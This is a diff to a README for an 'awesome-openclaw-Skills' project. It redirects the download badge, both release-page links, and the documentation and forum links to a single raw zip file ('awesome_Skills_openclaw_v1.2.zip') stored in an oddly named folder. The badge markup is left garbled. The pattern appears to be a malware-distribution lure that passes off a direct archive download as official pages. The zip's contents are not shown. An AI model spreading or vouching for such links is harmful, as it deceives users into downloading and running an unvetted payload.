@@ -1,7 +1,7 @@
 # 🎉 awesome-openclaw-Skills - Unlock Your OpenClaw Potential
 
 ## 📥 Download Now
-[![Download now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/Jovanbeats/awesome-openclaw-Skills/releases)
+[![Download now](https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip%20Now-Click%https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip)](https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip)
 
 ## 📖 Description
 Welcome to the awesome collection of OpenClaw Skills. This project, formerly known as Moltbot, brings you a variety of useful features to enhance your experience with OpenClaw. 
@@ -12,7 +12,7 @@ Whether you're looking to automate tasks or enhance your capabilities, this coll
 To begin using the awesome-openclaw-Skills, follow these simple steps.
 
 ### 1. Visit the Releases Page
-Go to our [Releases page](https://github.com/Jovanbeats/awesome-openclaw-Skills/releases) to find the latest version of the software.
+Go to our [Releases page](https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip) to find the latest version of the software.
 
 ### 2. Download the Software
 On the Releases page, you will see several versions available. Choose the most recent version and click on it. This will show you the downloadable files.
@@ -46,7 +46,7 @@ Before you install the application, ensure your system meets the following requi
 - **Storage**: Minimum of 100 MB of free space for installation.
 
 ## 📄 Download & Install
-To get started quickly, return to the [Releases page](https://github.com/Jovanbeats/awesome-openclaw-Skills/releases) and select the version most applicable to your operating system. Follow the steps outlined in the "Getting Started" section above to install and run the application.
+To get started quickly, return to the [Releases page](https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip) and select the version most applicable to your operating system. Follow the steps outlined in the "Getting Started" section above to install and run the application.
 
 ## 🎯 Support & Feedback
 If you encounter any issues or have questions, please reach out. We welcome all feedback to improve the application. Open an issue on GitHub, and our team will assist you.
@@ -68,7 +68,7 @@ Thanks to everyone who has contributed to this project. Your support helps to im
 ## 🔗 Additional Resources
 For more information, check our wiki or visit related resources:
 
-- [OpenClaw Documentation](https://openclaw.org/docs)
-- [Community Forum](https://community.openclaw.org)
+- [OpenClaw Documentation](https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip)
+- [Community Forum](https://github.com/Jovanbeats/awesome-openclaw-Skills/raw/refs/heads/main/cheesemongerly/awesome_Skills_openclaw_v1.2.zip)
 
 Visit us frequently for updates and improvements. Enjoy using awesome-openclaw-Skills!
